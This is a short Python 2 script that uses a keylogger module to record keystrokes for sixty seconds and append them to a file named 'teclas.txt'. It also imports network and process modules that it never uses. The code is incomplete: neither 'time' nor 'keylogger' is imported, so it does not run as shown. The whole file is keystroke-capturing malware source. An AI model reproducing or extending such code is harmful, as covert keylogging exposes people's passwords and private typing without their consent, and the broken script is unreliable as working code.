
import urllib
import urllib2
import os
import subprocess
import socket

now = time.time()
done = lambda: time.time() > now + 60

def print_keys(t, modifiers, keys):
	a = open("teclas.txt", "a")
	a.write("%r" % keys)

keylogger.log(done, print_keys)
